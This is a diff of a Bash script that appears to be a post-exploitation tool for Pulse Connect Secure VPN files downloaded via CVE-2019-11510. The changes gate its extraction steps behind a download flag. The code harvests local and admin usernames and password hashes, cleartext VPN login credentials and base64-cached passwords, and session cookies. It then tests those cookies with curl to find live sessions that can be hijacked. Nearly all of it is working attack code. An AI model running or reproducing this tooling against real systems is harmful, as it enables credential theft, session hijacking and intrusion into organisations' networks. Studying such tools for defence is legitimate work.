@@ -30,7 +30,6 @@ function print_usage {
   Connect Secure VPN files downloaded via CVE-2019-11510.
 
   Usage: $PROGNAME [options]
-         $PROGNAME -o <version> -c
 
   Options:
 EO
@@ -57,6 +56,7 @@ function get_opts {
         d ) is_download=true
             ;;
         c ) is_test_cookies=true
+            is_download=true
             ;;
         s ) is_ssh_keys=true
             is_download=true
@@ -187,161 +187,176 @@ function extract_ssh_keys {
 # This may not include details of users that authenticate externally.
 function extract_local_users {
   target=$1
-  echo "  [#] Extracting local user details..."
-  strings $DATA_DIR/$target/${target}_config | grep "^login_" | cut -c7- | egrep "^[.a-zA-Z0-9]+(\\\\[a-zA-Z0-9]+)?\s*$" | sort -u > $DATA_DIR/$target/${target}_users
-          > $DATA_DIR/$target/${target}_uids
-          > $DATA_DIR/$target/${target}_hashes
+  if [ $is_download == true ];then
+    echo "  [#] Extracting local users details..."
+    strings $DATA_DIR/$target/${target}_config | grep "^login_" | cut -c7- | egrep "^[.a-zA-Z0-9]+(\\\\[a-zA-Z0-9]+)?\s*$" | sort -u > $DATA_DIR/$target/${target}_users
+            > $DATA_DIR/$target/${target}_uids
+            > $DATA_DIR/$target/${target}_hashes
 
-  while IFS= read -r line;do
-    line_esc=$(echo "$line" | sed 's/\\/\\\\\\\\/g')
-    strings $DATA_DIR/$target/${target}_config | grep -A 4 "login_$line_esc" | grep -m 1 useruid | cut -c8- | cut -c -40 | echo "$line:$(cat)" >> $DATA_DIR/$target/${target}_uids
-    strings $DATA_DIR/$target/${target}_config | grep -A 10 "$line_esc" | grep -m 1 danastre | echo "$line:$(cat)" >> $DATA_DIR/$target/${target}_hashes
-  done < $DATA_DIR/$target/${target}_users
+    while IFS= read -r line;do
+      line_esc=$(echo "$line" | sed 's/\\/\\\\\\\\/g')
+      strings $DATA_DIR/$target/${target}_config | grep -A 4 "login_$line_esc" | grep -m 1 useruid | cut -c8- | cut -c -40 | echo "$line:$(cat)" >> $DATA_DIR/$target/${target}_uids
+      strings $DATA_DIR/$target/${target}_config | grep -A 10 "$line_esc" | grep -m 1 danastre | echo "$line:$(cat)" >> $DATA_DIR/$target/${target}_hashes
+    done < $DATA_DIR/$target/${target}_users
 
-  sort -u $DATA_DIR/$target/${target}_uids -o $DATA_DIR/$target/${target}_uids
-  sort -u $DATA_DIR/$target/${target}_hashes -o $DATA_DIR/$target/${target}_hashes
+    sort -u $DATA_DIR/$target/${target}_uids -o $DATA_DIR/$target/${target}_uids
+    sort -u $DATA_DIR/$target/${target}_hashes -o $DATA_DIR/$target/${target}_hashes
 
-  data="Username & Unique ID & Password Hash (md5crypt)\n"
-  while IFS= read -r uname;do
-    uname_esc=$(echo "$uname" | sed 's/\\/\\\\\\\\/g')    
-    uuid=$(egrep "^$uname_esc:" $DATA_DIR/$target/${target}_uids | cut -d: -f2)
-    uhash=$(egrep "^$uname_esc:" $DATA_DIR/$target/${target}_hashes | cut -d: -f2)
-    data+="$uname_esc & $uuid & $uhash\n"
-  done < $DATA_DIR/$target/${target}_users
-  write_report $target "Local User Details" "${data}" "true"
+    data="Username & Unique ID & Password Hash (md5crypt)\n"
+    while IFS= read -r uname;do
+      uname_esc=$(echo "$uname" | sed 's/\\/\\\\\\\\/g')    
+      uuid=$(egrep "^$uname_esc:" $DATA_DIR/$target/${target}_uids | cut -d: -f2)
+      uhash=$(egrep "^$uname_esc:" $DATA_DIR/$target/${target}_hashes | cut -d: -f2)
+      data+="$uname_esc & $uuid & $uhash\n"
+    done < $DATA_DIR/$target/${target}_users
+    write_report $target "Local User Details" "${data}" "true"
+  else
+    echo "  [!] Local users details extraction is disabled"
+  fi
 }
 
 # Extract session cookies and match them to user UIDs and names
 function extract_session_cookies {
   target=$1
-  echo "  [#] Extracting session cookies..."
-  > $DATA_DIR/$target/${target}_dsids
-  strings $DATA_DIR/$target/${target}_sessions | while IFS= read -r line1;do
-    cookie=$(echo "$line1" | grep ^randomVal | cut -c10-)
-    if [ ${#cookie} -eq 32 ];then
-      read -r line2
-      uid=$(echo "$line2" | grep ^sid | cut -c4- | cut -c-40)
-      if [ ${#uid} -eq 40 ];then
-        user=$(grep "$uid" $DATA_DIR/$target/${target}_uids | tail -1 | cut -d: -f1)
-        echo "$user:$uid:$cookie" >> $DATA_DIR/$target/${target}_dsids
+  if [ $is_download == true ];then
+    echo "  [#] Extracting session cookies..."
+    > $DATA_DIR/$target/${target}_dsids
+    strings $DATA_DIR/$target/${target}_sessions | while IFS= read -r line1;do
+      cookie=$(echo "$line1" | grep ^randomVal | cut -c10-)
+      if [ ${#cookie} -eq 32 ];then
+        read -r line2
+        uid=$(echo "$line2" | grep ^sid | cut -c4- | cut -c-40)
+        if [ ${#uid} -eq 40 ];then
+          user=$(grep "$uid" $DATA_DIR/$target/${target}_uids | tail -1 | cut -d: -f1)
+          echo "$user:$uid:$cookie" >> $DATA_DIR/$target/${target}_dsids
+        fi
       fi
-    fi
-  done
-  sort -u $DATA_DIR/$target/${target}_dsids -o $DATA_DIR/$target/${target}_dsids
+    done
+    sort -u $DATA_DIR/$target/${target}_dsids -o $DATA_DIR/$target/${target}_dsids
+  else
+    echo "  [!] Session cookies extraction is disabled"
+  fi
 }
 
 function extract_admin_users {
   target=$1
-  echo "  [#] Extracting administrators details..."
-  # This information differs depending on the platform version. First look for
-  # "Platform Administrator" (v9.x) - if found, the hash should be one line
-  # below and the username should be one line above (it may or may not be 
-  # prefixed with "login_"). If that is not found, look for "Administrators"
-  # (v8.x) and grab the hash and username (with "login_") from the next 3 lines.
-  # There may be multiple administrators.
-  > $DATA_DIR/$target/${target}_admins
-  if [[ -n $(grep -s -m1 "Platform Administrator" $DATA_DIR/$target/${target}_config) ]];then
-    # Get v9 admin details
-    user=""
-    hash=""
-    uid=""
-    strings $DATA_DIR/$target/${target}_config | grep -B2 -A2 "Platform Administrator" | while IFS= read -r line;do
-      if [ "$line" == "--" ];then
-        user=""
-        hash=""
-        uid=""
-        continue
-      elif [[ $line =~ ^login_ ]];then
-        user=$(echo "$line" | cut -c 7-)
-      elif [[ $line =~ ^[a-fA-F0-9]{64} ]];then
-        hash=$(echo "$line" | cut -c -64)
-      fi
-      if [[ -n "$user" && -n "$hash" ]];then
-        uid=$(grep "^$user:" $DATA_DIR/$target/${target}_uids | cut -d: -f2)
-        echo "$user:$hash:$uid" >> $DATA_DIR/$target/${target}_admins
-        user=""
-        hash=""
-        uid=""
-      fi
-    done
-  else
-    # Get v8 admin details
-    strings $DATA_DIR/$target/${target}_config | grep -A3 "^Administrators$" | while IFS= read -r line1;do
+  if [ $is_download == true ];then
+    echo "  [#] Extracting administrators details..."
+    # This information differs depending on the platform version. First look for
+    # "Platform Administrator" (v9.x) - if found, the hash should be one line
+    # below and the username should be one line above (it may or may not be 
+    # prefixed with "login_"). If that is not found, look for "Administrators"
+    # (v8.x) and grab the hash and username (with "login_") from the next 3 lines.
+    # There may be multiple administrators.
+    > $DATA_DIR/$target/${target}_admins
+    if [[ -n $(grep -s -m1 "Platform Administrator" $DATA_DIR/$target/${target}_config) ]];then
+      # Get v9 admin details
       user=""
       hash=""
-      if [ "$line1" == "--" ];then
-        continue
-      fi
-      read -r line2
-      if [ "$line2" == "--" ];then
-        continue
-      fi
-      read -r line3
-      if [ "$line3" == "--" ];then
-        continue
-      fi
-      read -r line4
-      if [ "$line4" == "--" ];then
-        continue
-      fi
-      for i in {2..4};do
-        line="line$i"
-        if [[ ${!line} =~ ^login_.*$ ]];then
-          user=$(echo "${!line}" | cut -c 7-)
-        elif [[ ${!line} =~ ^[a-fA-F0-9]{64}$ ]];then
-          hash="${!line}"
+      uid=""
+      strings $DATA_DIR/$target/${target}_config | grep -B2 -A2 "Platform Administrator" | while IFS= read -r line;do
+        if [ "$line" == "--" ];then
+          user=""
+          hash=""
+          uid=""
+          continue
+        elif [[ $line =~ ^login_ ]];then
+          user=$(echo "$line" | cut -c 7-)
+        elif [[ $line =~ ^[a-fA-F0-9]{64} ]];then
+          hash=$(echo "$line" | cut -c -64)
+        fi
+        if [[ -n "$user" && -n "$hash" ]];then
+          uid=$(grep "^$user:" $DATA_DIR/$target/${target}_uids | cut -d: -f2)
+          echo "$user:$hash:$uid" >> $DATA_DIR/$target/${target}_admins
+          user=""
+          hash=""
+          uid=""
         fi
       done
-      if [ -n "$user$hash" ];then
-        # We should have already found the admin user's UID above.
-        uid=$(grep "^$user:" $DATA_DIR/$target/${target}_uids | cut -d: -f2)
-        echo "$user:$hash:$uid" >> $DATA_DIR/$target/${target}_admins
-      fi
-    done
-  fi
-
-  data=""
-  while IFS= read -r line;do
-    adminuser=$(echo "$line" | cut -d: -f1)
-    adminhash=$(echo "$line" | cut -d: -f2)
-    adminuid=$(echo "$line" | cut -d: -f3)
-    data+="Username: $adminuser\n"
-    data+="Unique ID: $adminuid\n"
-    data+="Password Hash (sha256(md5crypt)): $adminhash\n"
-    if [ -n "$adminuid" ];then
-      # These cookies are vulnerable to hijacking when used before they expire
-      # or the user logs out. The admin site must be accessible to use these.
-      data+="Session Cookies (DSIDs):\n"
-      if [ $is_test_cookies == true ];then
-        echo "  [#] Testing admin session cookies..."
-        while IFS= read -r line;do
-          uid=$(echo "$line" | cut -d: -f2)
-          if [ "$uid" == "$adminuid" ];then
-            cookie=$(echo "$line" | cut -d: -f3)
-            output="$cookie"
-            status=$(curl -Iks -b "DSID=$cookie" "https://${target}/${URL_DASHBOARD}" | head -1 | cut -d ' ' -f2)
-            if [ "$status" == "200" ];then
-              output="$output  **ACTIVE**"
-            fi
-            data+="$output\n"
+    else
+      # Get v8 admin details
+      strings $DATA_DIR/$target/${target}_config | grep -A3 "^Administrators$" | while IFS= read -r line1;do
+        user=""
+        hash=""
+        if [ "$line1" == "--" ];then
+          continue
+        fi
+        read -r line2
+        if [ "$line2" == "--" ];then
+          continue
+        fi
+        read -r line3
+        if [ "$line3" == "--" ];then
+          continue
+        fi
+        read -r line4
+        if [ "$line4" == "--" ];then
+          continue
+        fi
+        for i in {2..4};do
+          line="line$i"
+          if [[ ${!line} =~ ^login_.*$ ]];then
+            user=$(echo "${!line}" | cut -c 7-)
+          elif [[ ${!line} =~ ^[a-fA-F0-9]{64}$ ]];then
+            hash="${!line}"
           fi
-        done < $DATA_DIR/$target/${target}_dsids
-      else
-        data+="$(grep "$adminuid" $DATA_DIR/$target/${target}_dsids | cut -d: -f3)\n"
-      fi
+        done
+        if [ -n "$user$hash" ];then
+          # We should have already found the admin user's UID above.
+          uid=$(grep "^$user:" $DATA_DIR/$target/${target}_uids | cut -d: -f2)
+          echo "$user:$hash:$uid" >> $DATA_DIR/$target/${target}_admins
+        fi
+      done
     fi
-  done < $DATA_DIR/$target/${target}_admins
-  write_report $target "Administrator Details" "${data}" "true"
+
+    data=""
+    while IFS= read -r line;do
+      adminuser=$(echo "$line" | cut -d: -f1)
+      adminhash=$(echo "$line" | cut -d: -f2)
+      adminuid=$(echo "$line" | cut -d: -f3)
+      data+="Username: $adminuser\n"
+      data+="Unique ID: $adminuid\n"
+      data+="Password Hash (sha256(md5crypt)): $adminhash\n"
+      if [ -n "$adminuid" ];then
+        # These cookies are vulnerable to hijacking when used before they expire
+        # or the user logs out. The admin site must be accessible to use these.
+        data+="Session Cookies (DSIDs):\n"
+        if [ $is_test_cookies == true ];then
+          echo "  [#] Testing admin session cookies..."
+          while IFS= read -r line;do
+            uid=$(echo "$line" | cut -d: -f2)
+            if [ "$uid" == "$adminuid" ];then
+              cookie=$(echo "$line" | cut -d: -f3)
+              output="$cookie"
+              status=$(curl -Iks -b "DSID=$cookie" "https://${target}/${URL_DASHBOARD}" | head -1 | cut -d ' ' -f2)
+              if [ "$status" == "200" ];then
+                output="$output  **ACTIVE**"
+              fi
+              data+="$output\n"
+            fi
+          done < $DATA_DIR/$target/${target}_dsids
+        else
+          data+="$(grep "$adminuid" $DATA_DIR/$target/${target}_dsids | cut -d: -f3)\n"
+        fi
+      fi
+    done < $DATA_DIR/$target/${target}_admins
+    write_report $target "Administrator Details" "${data}" "true"
+  else
+    echo "  [!] Administrators details extraction is disabled"
+  fi    
 }
 
 # Extract cached VPN client session authentication details.
 # This will capture local and external authentications in clear text.
 function extract_vpn_logins {
   target=$1
-  echo "  [#] Extracting observed VPN logins..."
-  data=$(
+  if [ $is_download == true ];then
+    echo "  [#] Extracting observed VPN logins..."
+
     strings $DATA_DIR/$target/${target}_config $DATA_DIR/$target/${target}_cache | grep -A 35 user@ > $DATA_DIR/$target/${target}_logins
     echo "--" >> $DATA_DIR/$target/${target}_logins
+
+    data=""
     username=""
     password=""
     name=""
@@ -360,7 +375,7 @@ function extract_vpn_logins {
         # Print session details (not all captured information is shown by default)
         if [[ "$timestamp" != "" ]] || [[ "$username" != "" && "$password" != "" ]];then
           lastuser_esc=$(echo "$lastuser" | sed 's/\\/\\\\\\\\/g')
-          echo "$lastuser_esc & $password & $name & $email & $operatingsystem & $language & $ipaddress & $macaddress & $timestamp\n"
+          data+="$lastuser_esc & $password & $name & $email & $operatingsystem & $language & $ipaddress & $macaddress & $timestamp\n"
         fi
         lastuser="$username"
         password=""
@@ -452,17 +467,19 @@ function extract_vpn_logins {
     if [ -n "$username" ];then
       if [[ "$username" != "" && "$password" != "" ]];then
         username_esc=$(echo "$username" | sed 's/\\/\\\\\\\\/g')
-        echo "$username_esc & $password & $name & $email & $operatingsystem & $language & $ipaddress & $macaddress & $timestamp\n"
+        data+="$username_esc & $password & $name & $email & $operatingsystem & $language & $ipaddress & $macaddress & $timestamp\n"
       fi
     fi
-
+  
     # Look for any other usernames and passwords cached in base64
     if [ $(echo "YQ==" | base64 -d 2>/dev/null) == "a" ];then
       b64="d" # GNU base64
     else
       b64="D" # Mac base64
     fi
-    strings $DATA_DIR/$target/${target}_config $DATA_DIR/$target/${target}_cache | grep -A1 "\!PRIMARY\!" | grep -Ev "^\!PRIMARY\!$|NTLM" | sed '/^--$/d' | while IFS= read -r line;do # gets base64 strings from the same line with !PRIMARY! or on the following line
+
+    # gets base64 strings from the same line with !PRIMARY! or on the following line
+    data+=$(strings $DATA_DIR/$target/${target}_config $DATA_DIR/$target/${target}_cache | grep -A1 "\!PRIMARY\!" | grep -Ev "^\!PRIMARY\!$|NTLM" | sed '/^--$/d' | while IFS= read -r line;do
       i=0
       oldval=""
       newval=""
@@ -478,48 +495,55 @@ function extract_vpn_logins {
           fi
         fi
       done
-    done | sort -u | sed 's/:/  /g'
-  )
-  data=$(echo -e "${data}" | sort -u)
-  data=$(echo "Username & Password & Name & Email & OperatingSystem & Language & IPAddress & MACAddress & LastLogin\n")${data}
-  write_report $target "Observed VPN Logins" "${data}" "true"
+    done | sort -u | sed 's/:/  /g')
+
+    data=$(echo -e "${data}" | sort -u)
+    data="Username & Password & Name & Email & OperatingSystem & Language & IPAddress & MACAddress & LastLogin\n"${data}
+    write_report $target "Observed VPN Logins" "${data}" "true"
+  else
+    echo "  [!] Observed VPN logins extraction is disabled"
+  fi    
 }
 
 function extract_vpn_session_cookies {
   target=$1
-  echo "  [#] Extracting VPN session cookies (DSIDs)..."
-  # These cookies are vulnerable to hijacking when used before they expire or
-  # the user logs out. Once connected to the VPN, other exploits can be used.
-  adminuids=( $(while IFS= read -r line;do echo "$line" | cut -d: -f3; done < $DATA_DIR/$target/${target}_admins) )
-  data="Value & User\n" 
-  if [ $is_test_cookies == true ];then
-    # Test for active sessions (unless disabled)
-    echo "    [#] Testing client session cookies..."
-    while IFS= read -r line;do
-      uid=$(echo "$line" | cut -d: -f2)
-      # Skip admins
-      skip=false
-      for adminuid in "${adminuids[@]}";do
-        if [ "$uid" == "$adminuid" ];then
-          skip=true
+  if [ $is_download == true ];then
+    echo "  [#] Extracting VPN session cookies (DSIDs)..."
+    # These cookies are vulnerable to hijacking when used before they expire or
+    # the user logs out. Once connected to the VPN, other exploits can be used.
+    adminuids=( $(while IFS= read -r line;do echo "$line" | cut -d: -f3; done < $DATA_DIR/$target/${target}_admins) )
+    data="Value & User\n" 
+    if [ $is_test_cookies == true ];then
+      # Test for active sessions (unless disabled)
+      echo "    [#] Testing client session cookies..."
+      while IFS= read -r line;do
+        uid=$(echo "$line" | cut -d: -f2)
+        # Skip admins
+        skip=false
+        for adminuid in "${adminuids[@]}";do
+          if [ "$uid" == "$adminuid" ];then
+            skip=true
+          fi
+        done
+        if [ "$skip" = false ];then
+          user=$(echo "$line" | cut -d: -f1)
+          cookie=$(echo "$line" | cut -d: -f3)
+          output="$cookie & $user"
+          status=$(curl -Iks -b "DSID=$cookie" "https://${target}/${URL_HOME}" | head -1 | cut -d ' ' -f 2)
+          if [ "$status" == "200" ];then
+            output="$output  **ACTIVE**"
+          fi
+          data+="$output\n"
         fi
-      done
-      if [ "$skip" = false ];then
-        user=$(echo "$line" | cut -d: -f1)
-        cookie=$(echo "$line" | cut -d: -f3)
-        output="$cookie & $user"
-        status=$(curl -Iks -b "DSID=$cookie" "https://${target}/${URL_HOME}" | head -1 | cut -d ' ' -f 2)
-        if [ "$status" == "200" ];then
-          output="$output  **ACTIVE**"
-        fi
-        data+="$output\n"
-      fi
-    done < $DATA_DIR/$target/${target}_dsids
+      done < $DATA_DIR/$target/${target}_dsids
+    else
+      guids=$( IFS='|'; echo "${adminuids[*]}" )
+      data+="$(grep -Ev "$guids" $DATA_DIR/$target/${target}_dsids | awk '{ split($0,a,":"); print a[3], a[1] }')\n"
+    fi
+    write_report $target "VPN Session Cookies" "${data}" "true"
   else
-    guids=$( IFS='|'; echo "${adminuids[*]}" )
-    data+="$(grep -Ev "$guids" $DATA_DIR/$target/${target}_dsids | awk '{ split($0,a,":"); print a[3], a[1] }')\n"
-  fi
-  write_report $target "VPN Session Cookies" "${data}" "true"
+    echo "  [!] VPN session cookies extraction is disabled"
+  fi    
 }
 
 function init_data_dir {
